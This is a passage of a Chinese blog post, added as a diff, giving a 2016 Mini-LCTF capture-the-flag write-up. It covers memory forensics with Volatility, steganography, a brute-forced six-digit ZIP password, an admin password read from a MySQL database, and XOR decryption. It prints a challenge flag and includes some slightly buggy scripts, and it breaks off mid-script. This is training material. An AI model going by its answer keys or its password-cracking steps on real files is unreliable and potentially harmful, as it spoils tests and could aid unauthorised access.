@@ -1,0 +1,1795 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="9I2ZJGCGSFZ3JOIR2o2ugq8lnm-NLadndUPsCsXXgFc" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Mini-LCTF WriteUp" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="0x00昨天算是成为了L-Team烧水组的一员，先mark一下，慢慢来吧，希望自己能成为未来的核心成员，先发一篇来自L-Team的2016 Mini-LCTF的WriteUp.
+0x01 ForensicsK-ON!
+Description:补番系列之六：http://bangumi.bilibili.com/anime/1174
+File:Nakano.jpg
+WriteUP:
+http://m">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mini-LCTF WriteUp">
+<meta property="og:url" content="http://pupiles.com/Mini-LCTF_WriteUp.html">
+<meta property="og:site_name" content="Pupiles blog">
+<meta property="og:description" content="0x00昨天算是成为了L-Team烧水组的一员，先mark一下，慢慢来吧，希望自己能成为未来的核心成员，先发一篇来自L-Team的2016 Mini-LCTF的WriteUp.
+0x01 ForensicsK-ON!
+Description:补番系列之六：http://bangumi.bilibili.com/anime/1174
+File:Nakano.jpg
+WriteUP:
+http://m">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006tT0yqjw1fazqcei1duj30h508e0to.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006tT0yqjw1fazqcedsraj30mq03ymyo.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006tT0yqjw1fazqcefmslj30k10fgwj6.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006tT0yqjw1fazqcej6i6j30pe029mxi.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/006tT0yqjw1fb047stz63j30ef0ajdj4.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006tT0yqjw1fazqced046j30gu04mjtc.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006tT0yqjw1fazzdehls1j30el06rdge.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006tT0yqjw1fazzdeu69ij30eg0213yy.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006tT0yqjw1fazzdf2jfmj309q06vwfc.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006tT0yqjw1fazzdessqqj30e50bstb4.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006tT0yqjw1fazzdf70eqj30c60b175z.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/006tT0yqjw1fazzdeiv9aj30di03jweq.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006tT0yqjw1fb01ahvws7j31kw02tdgh.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/006tT0yqjw1fb01arip93j31kw03l3zd.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006tT0yqjw1fb01af3dn1j31kw042js9.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006tT0yqjw1fb01aj7ff1j31kw04ut9q.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/006tT0yqjw1fb01rh9wy0j30pl08jgmh.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006tT0yqjw1fb01tl88qkj30oh0453zm.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006tT0yqjw1fb01tk3cncj30o705lq4m.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006tT0yqjw1fb01tijdkwj30o003bq3j.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006tT0yqjw1fb020jf5rbj30ov0b740h.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006tT0yqjw1fb023qcarvj30r80ez75o.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006tT0yqjw1fb029qp4ypj30ow0a8q4d.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006tT0yqjw1fb02f3lt8kj30xi0d1411.jpg">
+<meta property="og:image" content="http://pupiles.com/x">
+<meta property="og:image" content="http://7xou8t.com1.z0.glb.clouddn.com/snipaste_co38puChina Standard Timeernpm38e_u38ernpm38e_20161224_213838.png">
+<meta property="og:image" content="http://7xou8t.com1.z0.glb.clouddn.com/snipaste_co42puChina Standard Timeernpm42e_u8ernpm42e_20161224_214208.png">
+<meta property="og:image" content="http://7xou8t.com1.z0.glb.clouddn.com/snipaste_co46puChina Standard Timeernpm46e_u2ernpm46e_20161224_214602.png">
+<meta property="og:image" content="http://7xou8t.com1.z0.glb.clouddn.com/gjsf.png">
+<meta property="og:image" content="http://7xou8t.com1.z0.glb.clouddn.com/snipaste_co13puChina Standard Timeernpm13e_u26ernpm13e_20161224_221326.png">
+<meta property="og:updated_time" content="2017-05-23T06:27:06.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mini-LCTF WriteUp">
+<meta name="twitter:description" content="0x00昨天算是成为了L-Team烧水组的一员，先mark一下，慢慢来吧，希望自己能成为未来的核心成员，先发一篇来自L-Team的2016 Mini-LCTF的WriteUp.
+0x01 ForensicsK-ON!
+Description:补番系列之六：http://bangumi.bilibili.com/anime/1174
+File:Nakano.jpg
+WriteUP:
+http://m">
+<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/006tT0yqjw1fazqcei1duj30h508e0to.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://pupiles.com/Mini-LCTF_WriteUp.html"/>
+
+
+
+
+
+  <title> Mini-LCTF WriteUp | Pupiles blog </title>
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?a5cad5e7b7a8b5d3aea9f10d80c9f2b7";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pupiles blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">菜的要死的程序猿和Web狗</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://pupiles.com/Mini-LCTF_WriteUp.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Pupil">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://olgkg6ct5.bkt.clouddn.com/touxiang.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pupiles blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                Mini-LCTF WriteUp
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-23T16:55:35+08:00">
+                2017-05-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a class="cloud-tie-join-count" href="/Mini-LCTF_WriteUp.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count join-count" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/Mini-LCTF_WriteUp.html" class="leancloud_visitors" data-flag-title="Mini-LCTF WriteUp">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>昨天算是成为了L-Team烧水组的一员，先mark一下，慢慢来吧，希望自己能成为未来的核心成员，先发一篇来自L-Team的2016 Mini-LCTF的WriteUp.</p>
+<h2 id="0x01-Forensics"><a href="#0x01-Forensics" class="headerlink" title="0x01 Forensics"></a>0x01 Forensics</h2><p><strong>K-ON!</strong></p>
+<p>Description:补番系列之六：<a href="http://bangumi.bilibili.com/anime/1174" target="_blank" rel="external">http://bangumi.bilibili.com/anime/1174</a></p>
+<p>File:Nakano.jpg</p>
+<p>WriteUP:</p>
+<p><a href="http://minilctfdownload-1252778279.costj.myqcloud.com/xp.7z" target="_blank" rel="external">http://minilctfdownload-1252778279.costj.myqcloud.com/xp.7z</a></p>
+<p>这题是内存取证，其实很简单。首先，我们用编辑器打开图片就能看到内存dump的下载地址。这里是VMWare的虚拟内存文件，flag写在桌面的一个flag.txt里，同时这个txt在内存dump的时候，是打开显示在桌面的。因此，我们有几种解法：</p>
+<ul>
+<li><p>因为我在写flag.txt的时候，将flag复制在<code>clipboard</code>，因此直接使用工具<em>Volatility</em>就可以将<code>clipboard</code>的内容导出。</p>
+<p><img src="http://ww3.sinaimg.cn/large/006tT0yqjw1fazqcei1duj30h508e0to.jpg" alt="F100_1"></p>
+</li>
+</ul>
+<ul>
+<li><p>我们使用<code>filescan</code>插件就能找到内存里的文件。这里我们使用<code>grep</code>过滤下，得到以下结果：</p>
+<p><img src="http://ww1.sinaimg.cn/large/006tT0yqjw1fazqcedsraj30mq03ymyo.jpg" alt="F100_2"></p>
+</li>
+</ul>
+<hr>
+<p><strong>Angel Beats!</strong></p>
+<p>Description:补番列表之<a href="http://bangumi.bilibili.com/anime/959" target="_blank" rel="external">http://bangumi.bilibili.com/anime/959</a></p>
+<p>File:Kanade.png</p>
+<p>WriteUP:</p>
+<p>这题的思路是这样:</p>
+<ol>
+<li><p>图片LSB隐写还原一个下载链接:</p>
+<p><img src="http://ww1.sinaimg.cn/large/006tT0yqjw1fazqcefmslj30k10fgwj6.jpg" alt="F500_1"></p>
+</li>
+<li><p>从下载链接得到Docker镜像，并用命令挂载<code>cat Angel_Beats.tar|docker import - lctf:f500</code></p>
+<p><img src="http://ww1.sinaimg.cn/large/006tT0yqjw1fazqcej6i6j30pe029mxi.jpg" alt="F500_2"></p>
+</li>
+</ol>
+<ol>
+<li>运行并进入容器，可以发现在<code>/home/xxxx/</code>目录下有加密的一半flag。</li>
+<li>通过检查发现，容器有Apache和Mysql，运行访问80端口就能看到一个博客站点。而且能够发现有一个加密的文章。</li>
+<li>进入Mysql，得到管理员密码，进入后台就可以看到加密文章里的一半flag。<ol>
+<li>最后通过翻Mysql数据库可以发现一个<code>import</code>表，从中得到一个密钥。猜测AES加密，使用密钥和第三步的密文得到另一半flag。    </li>
+</ol>
+</li>
+</ol>
+<h2 id="0x02-Misc"><a href="#0x02-Misc" class="headerlink" title="0x02 Misc"></a>0x02 Misc</h2><p><strong>回转十三位</strong> </p>
+<p>Description: LFIEOU33ONUGS6C7OJQXAMDROJ6Q====</p>
+<p>WriteUp: Base32+rot13 (google rot13)</p>
+<hr>
+<p><strong>Easy</strong></p>
+<p>Description: LbbeCaarT3r}Fer{_i</p>
+<p>WriteUp: 栅栏密码</p>
+<hr>
+<p><strong>Noisy</strong></p>
+<p>File: wav</p>
+<p>WriteUp: </p>
+<p>查看频谱就可以了</p>
+<p>盗用参赛同学一张图:</p>
+<p><img src="http://ww4.sinaimg.cn/large/006tT0yqjw1fb047stz63j30ef0ajdj4.jpg" alt=""></p>
+<hr>
+<p><strong>Sword Art Online</strong></p>
+<p>Description: 补番系列之三：刀剑神域（B站没有自己找去。。。</p>
+<p>File: wtf.txt</p>
+<p>文件打开以后有1166400行,也就是1440*810,然后一行行把文件里给的三元组打印出来有一张图片,里面就有flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">ins = Image.new(<span class="string">"RGB"</span>,(<span class="number">1440</span>,<span class="number">810</span>))</div><div class="line"><span class="keyword">with</span> open(<span class="string">'wtf.txt'</span>) <span class="keyword">as</span> f:</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1441</span>):</div><div class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">811</span>):</div><div class="line">            data = f.readline().split(<span class="string">','</span>)</div><div class="line">            ins.putpixel((x,y),int(data[<span class="number">0</span>]),int(data[<span class="number">1</span>],int(data[<span class="number">2</span>])))</div><div class="line">ins.show()</div></pre></td></tr></table></figure>
+<hr>
+<p><strong>樱花庄的宠物女孩</strong></p>
+<p>Description: 补番系列之一：<a href="http://bangumi.bilibili.com/anime/687" target="_blank" rel="external">http://bangumi.bilibili.com/anime/687</a></p>
+<p>File: Mashiro.jpg</p>
+<p>WriteUp:</p>
+<ol>
+<li>用十六进制打开图片，发现其末尾有一段数据。</li>
+<li>用Base85既可以解开得到Flag</li>
+</ol>
+<hr>
+<p><strong>Steins;Gate</strong></p>
+<p>Desciption: 补番系列之二：<a href="http://bangumi.bilibili.com/anime/836" target="_blank" rel="external">http://bangumi.bilibili.com/anime/836</a></p>
+<p>File: <a href="http://10.170.55.102/static/uploads/7c922824952e37c8344fd9c6c93425af/Stardust_Shake_hand.zip" target="_blank" rel="external">Stardust_Shake_hand.zip</a></p>
+<p>WriteUp:</p>
+<ol>
+<li><p>使用<code>ElcomsoftPasswordRecoveryPortable</code>爆破ZIP密码（6位数字）</p>
+</li>
+<li><p>解压得到图片，通过分析可以发现图片是两张JPG图拼接在一起，且第二张图的头部被破坏了。</p>
+<p><img src="http://ww2.sinaimg.cn/large/006tT0yqjw1fazqced046j30gu04mjtc.jpg" alt="M150_1"></p>
+</li>
+<li><p>将第二张图片导出，并修复头部即可。</p>
+</li>
+</ol>
+<hr>
+<p><strong>魔法少女小圆</strong></p>
+<p>Description: 补番系列之四：<a href="http://bangumi.bilibili.com/anime/2539" target="_blank" rel="external">http://bangumi.bilibili.com/anime/2539</a></p>
+<p>File: Madoka.zip</p>
+<p>WriteUp:</p>
+<ol>
+<li><p>查看enc.py脚本，发现用<code>Crypto.Util.strxor.strxor()</code>函数将源图片与<strong>2000W位</strong>的PI进行异或。</p>
+</li>
+<li><p>使用<code>FastPi.exe</code>程序生成2000W位或更大的PI，或者网上下载。</p>
+</li>
+<li><p>编写dec脚本（简单地利用enc.py)</p>
+</li>
+<li><p>从恢复出来的图片里找到.zip文件(文件头50 4B 03 04)</p>
+</li>
+<li><p>去除zip文件的伪加密，得到flag图片</p>
+<p>​</p>
+</li>
+</ol>
+<hr>
+<p><strong>MoreThings</strong></p>
+<p>Description: An interesting PDF</p>
+<p>File: MoreThings.pdf</p>
+<p>WriteUp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="keyword">for</span> ($i=<span class="number">10000</span>; $i &gt;= <span class="number">0</span>; $i--)</div><div class="line">&#123;</div><div class="line">  $j = $i + <span class="number">1</span>;</div><div class="line">  <span class="keyword">if</span> ($j &lt; <span class="number">10001</span>)</div><div class="line">  &#123;</div><div class="line">    exec(<span class="string">"rm pdf$j.pdf"</span>);</div><div class="line">  &#125;</div><div class="line">  exec(<span class="string">"pdfdetach pdf$i.pdf -saveall"</span>);</div><div class="line">  <span class="keyword">echo</span> $i.<span class="string">"\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<hr>
+<p><strong>Document</strong></p>
+<p>Description: </p>
+<p>Word文档可以插入图片的说, 可这是怎么做到的呢?</p>
+<p>PS: 不要修改文档哦, 不然Flag可能会消失(我也不知道为什么).</p>
+<p>File: document.zip</p>
+<p>WriteUp:</p>
+<p>把Word文档当成压缩包解压开就可以看到有flag的那张图片</p>
+<h2 id="0x03-PPC"><a href="#0x03-PPC" class="headerlink" title="0x03 PPC"></a>0x03 PPC</h2><p><strong>mess_file</strong></p>
+<p>Description: flag被打乱了。排列组合，找到一个有意义的组合，按单词分组后提交。</p>
+<p>File: mess_file.zip</p>
+<p>Hint: </p>
+<p>Hint 1: </p>
+<p>其实不用求所有的排列组合。既然是flag是有意义的，那么它肯定是一些英语和数字组合成的单词。从所有的片段中挑两个，然后排列（即求 A(13, 2))，找到一个有意义的，即可确定flag中的一个英语单词。接下来删掉已经确定的单词所在片段，得到一组新的片段。重复以上步骤，问题就变得越来越简单。最终得到flag。</p>
+<p>Hint 2: </p>
+<p>尝试把数字 1 换成字母 l，把 4 换成字母 a ，数字 0 换成字母 o 什么的。再试试看。</p>
+<p>hint 3: </p>
+<p>其实，最最重要的是开头的那个英文单词！首先把所有的数字对应的字母，然后从13个片断里找两个进行排列，最多有13乘12等于156种排法！英语单词常以辅音开头，这样再删去所有以元音开头的，就没剩几个了！这样就能确定第一个单词啊啊！剩下的就很容易了！可以靠人工拼接，也可以用hint<br> 1的思路！</p>
+<p>hint 4: </p>
+<p>一共四个单词，长度分别是 4, 3, 4, 11</p>
+<p>WriteUp:</p>
+<p>题目是让从一堆文件里找到一些有意义的组合，组成flag。</p>
+<p>这道题考察算法，主要是想看看大家如何利用己知细节缩小搜索范围。</p>
+<p>出题时的代码是这样写的：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">#include &lt;iostream&gt;</div><div class="line"></div><div class="line">#include &lt;fstream&gt;</div><div class="line"></div><div class="line">#include &lt;string&gt;</div><div class="line"></div><div class="line">#include &lt;time.h&gt;</div><div class="line"></div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">using namespace std;</div><div class="line"></div><div class="line">int main ()</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">	fstream f;</div><div class="line"></div><div class="line">	string str ("h4v3funw1thp10g14mm1ng");</div><div class="line"></div><div class="line">	string directory ("mess_file\");</div><div class="line"></div><div class="line">	string filename;</div><div class="line"></div><div class="line">	char buf [4] = &#123;0&#125;;</div><div class="line"></div><div class="line">	int length;</div><div class="line"></div><div class="line">	int pos = 0;</div><div class="line"></div><div class="line">	int len;</div><div class="line"></div><div class="line">	srand (time (0));</div><div class="line"></div><div class="line">	while (pos &lt;= str.length ())</div><div class="line"></div><div class="line">	&#123;</div><div class="line"></div><div class="line">		filename.clear ();</div><div class="line"></div><div class="line">		for (int i = 0; i &lt; 5; i++)</div><div class="line"></div><div class="line">		&#123;</div><div class="line"></div><div class="line">			filename.append (1, 'a' + rand () % 26);</div><div class="line"></div><div class="line">		&#125;</div><div class="line"></div><div class="line">		filename.append (1, '\0');</div><div class="line"></div><div class="line">		filename = directory + filename;</div><div class="line"></div><div class="line">		f.open (filename.c_str (), ios::out | ios::app);</div><div class="line"></div><div class="line">		if (!f.good ())</div><div class="line"></div><div class="line">		&#123;</div><div class="line"></div><div class="line">			cout &lt;&lt; "open error" &lt;&lt; endl;</div><div class="line"></div><div class="line">			system ("pause");</div><div class="line"></div><div class="line">			return 0;</div><div class="line"></div><div class="line">		&#125;</div><div class="line"></div><div class="line">		len = (rand () % 3) + 1;</div><div class="line"></div><div class="line">		memset (buf, 0, 4);</div><div class="line"></div><div class="line">		strcpy (buf, str.substr (pos, len).c_str ());</div><div class="line"></div><div class="line">		pos = pos + len;</div><div class="line"></div><div class="line">		f.write (buf, 4);</div><div class="line"></div><div class="line">		f.close ();</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	return 0;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>嗯，基本没啥用。</p>
+<p>然后看题目，一共14个文件，其中有一文件里面啥都没有，删掉。</p>
+<p>现在我们来看看如何<strong>缩小搜索范围</strong>：</p>
+<p>与其找到所有的排列情况，我们不如尝试先找开头那个单词。最简单的情况，从13个文件里随便找两个进行组合，如果不行，就找三个，再不行就四个。聪明的你一定能想到出题人不可能会让你用四个或四个以上文件排列组合，没意思。事实上真实情况就是这样的，只要用两个进行组合，就能看到第一个单词have。代码如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line">import os</div><div class="line"></div><div class="line">from itertools import permutations</div><div class="line"></div><div class="line">#open and read files</div><div class="line"></div><div class="line">list = os.listdir("e:\mess_file")</div><div class="line"></div><div class="line">path = 'e:\mess_file\'</div><div class="line"></div><div class="line">allStr = []</div><div class="line"></div><div class="line">for filename in list:</div><div class="line"></div><div class="line">    filename = path + filename</div><div class="line"></div><div class="line">    file = open(filename, 'r')</div><div class="line"></div><div class="line">    m_str = file.readline()</div><div class="line"></div><div class="line">    file.close()</div><div class="line"></div><div class="line">    m_str = m_str.strip('\0')</div><div class="line"></div><div class="line">    allStr.append(m_str)</div><div class="line"></div><div class="line">print(allStr)</div><div class="line"></div><div class="line">#convert num to letter</div><div class="line">for i in range(0, len(allStr)):</div><div class="line"></div><div class="line">    allStr[i] = str.replace(allStr[i], '4', 'a')</div><div class="line"></div><div class="line">    allStr[i] = str.replace(allStr[i], '3', 'e')</div><div class="line"></div><div class="line">    allStr[i] = str.replace(allStr[i], '0', 'o')</div><div class="line"></div><div class="line">print (allStr)</div><div class="line"></div><div class="line">#permutations</div><div class="line"></div><div 